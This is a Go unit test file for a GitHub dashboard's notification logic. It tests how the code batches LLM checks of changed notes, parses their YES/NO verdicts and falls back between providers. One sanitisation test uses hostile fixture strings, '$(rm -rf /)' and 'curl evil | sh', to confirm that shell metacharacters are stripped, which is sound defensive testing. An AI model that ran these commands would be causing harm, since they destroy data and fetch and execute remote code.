package notify

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/Jonathan-Improving/githubslashboard/model"
	"github.com/Jonathan-Improving/githubslashboard/provider"
)

// recordingChecker is a Provider whose Summarize answers from a script and
// remembers every prompt it was given.
type recordingChecker struct {
	mu      sync.Mutex
	out     string
	err     error
	prompts []string
}

func (r *recordingChecker) Name() string { return "checker" }
func (r *recordingChecker) Invoke(ctx context.Context, req provider.Request, correction string) (string, error) {
	return "", errors.New("not used")
}
func (r *recordingChecker) Summarize(ctx context.Context, prompt string) (string, error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.prompts = append(r.prompts, prompt)
	return r.out, r.err
}
func (r *recordingChecker) calls() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return len(r.prompts)
}

func heldItems(n int) []Held {
	var out []Held
	for i := 1; i <= n; i++ {
		out = append(out, Held{
			Change:       Change{Entity: entityPR, Repo: "o/n", Number: i, Companion: "new note"},
			OldCompanion: "old note", OldEmoji: "⏳", NewEmoji: "🔄",
		})
	}
	return out
}

func numbers(cs []Change) []int {
	var out []int
	for _, c := range cs {
		out = append(out, c.Number)
	}
	return out
}

func sameInts(a, b []int) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

const checkTimeout = time.Second

// TDD 9.9: only PRs and issues with ProseHeldBack set are collected, carrying
// the prior prose.
func TestHeldBackCollectsOnlyProseHeldItems(t *testing.T) {
	prs := []model.PR{
		{Repo: "o/n", Number: 1, Emoji: "🔄", ProseHeldBack: &model.ProseChange{OldCompanion: "old", OldEmoji: "⏳"}},
		{Repo: "o/n", Number: 2, StatusChanged: true},
		{Repo: "o/n", Number: 3},
	}
	issues := []model.Issue{
		{Repo: "o/n", Number: 10, ProseHeldBack: &model.ProseChange{OldCompanion: "older"}},
		{Repo: "o/n", Number: 11},
	}
	gotPRs := HeldBackFromPRs(prs)
	if len(gotPRs) != 1 || gotPRs[0].Change.Number != 1 || gotPRs[0].OldCompanion != "old" || gotPRs[0].NewEmoji != "🔄" {
		t.Errorf("held PRs = %+v", gotPRs)
	}
	gotIssues := HeldBackFromIssues(issues)
	if len(gotIssues) != 1 || gotIssues[0].Change.Number != 10 || gotIssues[0].Change.Entity != entityIssue {
		t.Errorf("held issues = %+v", gotIssues)
	}
}

// TDD 9.10: one call covers the whole batch, and none is made for an empty one.
func TestCheckProseMakesOneCallForTheWholeBatch(t *testing.T) {
	p := &recordingChecker{out: "1=NO 2=NO 3=NO"}
	CheckProse(context.Background(), p, nil, heldItems(3), checkTimeout, checkTimeout, nil)
	if p.calls() != 1 {
		t.Errorf("checker called %d times for a batch of 3, want 1 (TDD 9.10)", p.calls())
	}
}

func TestCheckProseSkipsTheCallWhenNothingIsHeld(t *testing.T) {
	p := &recordingChecker{out: "1=YES"}
	got := CheckProse(context.Background(), p, nil, nil, checkTimeout, checkTimeout, nil)
	if p.calls() != 0 || len(got) != 0 {
		t.Errorf("calls = %d, changes = %v, want 0 and none for an empty batch (TDD 9.10)", p.calls(), got)
	}
}

// TDD 9.11: only meaningfully different items join the changed set.
func TestCheckProseKeepsOnlyMeaningfulDifferences(t *testing.T) {
	p := &recordingChecker{out: "1=NO 2=YES 3=NO 4=YES"}
	got := numbers(CheckProse(context.Background(), p, nil, heldItems(4), checkTimeout, checkTimeout, nil))
	if !sameInts(got, []int{2, 4}) {
		t.Errorf("changed = %v, want [2 4] (TDD 9.11)", got)
	}
}

func TestParseProseVerdictsShapes(t *testing.T) {
	cases := map[string]string{
		"plain line":      "1=NO 2=yes",
		"colon separator": "1: NO, 2: YES",
		"session wrapper": `{"summary":"1=NO 2=YES"}`,
		"after thinking":  "Let me think: 1=YES 2=YES\n...done thinking.\n1=NO 2=YES",
		"surrounding":     "Verdicts: 1=NO and 2=YES.",
	}
	for name, raw := range cases {
		got := parseProseVerdicts(raw)
		if len(got) != 2 || got[1] || !got[2] {
			t.Errorf("%s: verdicts = %v, want 1 false and 2 true", name, got)
		}
	}
}

// A live ollama run (glm-4.7-flash) returned exactly this: cursor show/hide
// codes between every token, and a thinking trace before the answer. Unit tests
// with a clean canned answer passed while the live format defeated the parser.
func TestParseProseVerdictsReadsRealOllamaOutput(t *testing.T) {
	raw := "YES\x1b[?25l\x1b[?25h.\x1b[?25l\x1b[?25h\n\n    Looks\x1b[?25l\x1b[?25h correct\x1b[?25l\x1b[?25h.\n" +
		"...done thinking.\n\n1\x1b[?25l\x1b[?25h=\x1b[?25l\x1b[?25hNO\x1b[?25l\x1b[?25h 2\x1b[?25l\x1b[?25h=\x1b[?25l\x1b[?25hNO\x1b[?25l\x1b[?25h 3\x1b[?25l\x1b[?25h=YES\x1b[?25l\x1b[?25h\n\n"
	got := parseProseVerdicts(raw)
	if len(got) != 3 || got[1] || got[2] || !got[3] {
		t.Errorf("verdicts = %v, want 1=NO 2=NO 3=YES", got)
	}
}

// TDD 9.15: an item without a verdict is counted as changed.
func TestCheckProseCountsUnjudgedItemsAsChanged(t *testing.T) {
	p := &recordingChecker{out: "1=NO 3=NO"}
	got := numbers(CheckProse(context.Background(), p, nil, heldItems(3), checkTimeout, checkTimeout, nil))
	if !sameInts(got, []int{2}) {
		t.Errorf("changed = %v, want [2]: the item with no verdict must notify (TDD 9.15)", got)
	}
}

func TestCheckProseCountsEverythingWhenBothProvidersFail(t *testing.T) {
	p := &recordingChecker{err: errors.New("down")}
	fb := &recordingChecker{out: "no idea"}
	got := numbers(CheckProse(context.Background(), p, fb, heldItems(3), checkTimeout, checkTimeout, nil))
	if !sameInts(got, []int{1, 2, 3}) {
		t.Errorf("changed = %v, want all three when both providers fail (TDD 9.15)", got)
	}
}

func TestCheckProseCountsEverythingWhenNoProviderIsAvailable(t *testing.T) {
	got := numbers(CheckProse(context.Background(), nil, nil, heldItems(2), checkTimeout, checkTimeout, nil))
	if !sameInts(got, []int{1, 2}) {
		t.Errorf("changed = %v, want both when no provider is available (TDD 9.15)", got)
	}
}

// TDD 9.14: the fallback gets one attempt at the same batch only after the
// primary fails, and is not consulted otherwise.
func TestCheckProseFallsBackWhenPrimaryFails(t *testing.T) {
	p := &recordingChecker{err: errors.New("timeout")}
	fb := &recordingChecker{out: "1=NO 2=YES"}
	got := numbers(CheckProse(context.Background(), p, fb, heldItems(2), checkTimeout, checkTimeout, nil))
	if !sameInts(got, []int{2}) {
		t.Errorf("changed = %v, want [2] from the fallback's verdicts", got)
	}
	if fb.calls() != 1 || p.calls() != 1 {
		t.Errorf("primary calls = %d, fallback calls = %d, want 1 and 1", p.calls(), fb.calls())
	}
	if len(fb.prompts) == 1 && fb.prompts[0] != p.prompts[0] {
		t.Error("the fallback must receive the same batch prompt as the primary")
	}
}

func TestCheckProseFallsBackOnUnparseableAnswer(t *testing.T) {
	p := &recordingChecker{out: "they all look similar to me"}
	fb := &recordingChecker{out: "1=NO"}
	got := CheckProse(context.Background(), p, fb, heldItems(1), checkTimeout, checkTimeout, nil)
	if len(got) != 0 || fb.calls() != 1 {
		t.Errorf("changes = %v, fallback calls = %d, want none and 1", got, fb.calls())
	}
}

func TestCheckProseNeverTriesFallbackWhenPrimarySucceeds(t *testing.T) {
	p := &recordingChecker{out: "1=NO"}
	fb := &recordingChecker{out: "1=YES"}
	CheckProse(context.Background(), p, fb, heldItems(1), checkTimeout, checkTimeout, nil)
	if fb.calls() != 0 {
		t.Errorf("fallback called %d times although the primary succeeded", fb.calls())
	}
}

// TDD 9.14: the fallback is bounded by the timeout it is given, not the primary's.
func TestCheckProseBoundsEachAttemptByItsOwnTimeout(t *testing.T) {
	var deadlines []time.Duration
	capture := &deadlineProvider{record: func(d time.Duration) { deadlines = append(deadlines, d) }}
	CheckProse(context.Background(), capture, capture, heldItems(1), 10*time.Second, 30*time.Second, nil)
	if len(deadlines) != 2 {
		t.Fatalf("attempts = %d, want 2", len(deadlines))
	}
	if deadlines[0] > 10*time.Second || deadlines[1] <= 10*time.Second || deadlines[1] > 30*time.Second {
		t.Errorf("deadlines = %v, want primary within 10s and fallback within 30s", deadlines)
	}
}

type deadlineProvider struct{ record func(time.Duration) }

func (d *deadlineProvider) Name() string { return "deadline" }
func (d *deadlineProvider) Invoke(ctx context.Context, req provider.Request, correction string) (string, error) {
	return "", errors.New("not used")
}
func (d *deadlineProvider) Summarize(ctx context.Context, prompt string) (string, error) {
	dl, _ := ctx.Deadline()
	d.record(time.Until(dl))
	return "", errors.New("fail")
}

// TDD 9.16: notes are sanitized before they enter the prompt.
func TestProseDiffPromptSanitizesNotes(t *testing.T) {
	held := []Held{{
		Change:       Change{Repo: "o/n", Number: 1, Companion: "new $(rm -rf /) note `x`"},
		OldCompanion: "old ; curl evil | sh note", OldEmoji: "⏳", NewEmoji: "🔄",
	}}
	prompt := proseDiffPrompt(held)
	for _, bad := range []string{"$(", "`", ";", "|"} {
		if strings.Contains(prompt[strings.Index(prompt, "1. "):], bad) {
			t.Errorf("prompt item section still contains %q (TDD 9.16)", bad)
		}
	}
	if !strings.Contains(prompt, "OLD: old") || !strings.Contains(prompt, "NEW: new") {
		t.Errorf("sanitized notes missing from prompt: %q", prompt)
	}
}

func TestProseDiffPromptMarksAnEmptyNote(t *testing.T) {
	prompt := proseDiffPrompt([]Held{{Change: Change{Repo: "o/n", Number: 1, Companion: "a new note"}}})
	if !strings.Contains(prompt, "OLD: "+noNote) {
		t.Errorf("an empty old note should read %q in the prompt, got %q", noNote, prompt)
	}
}
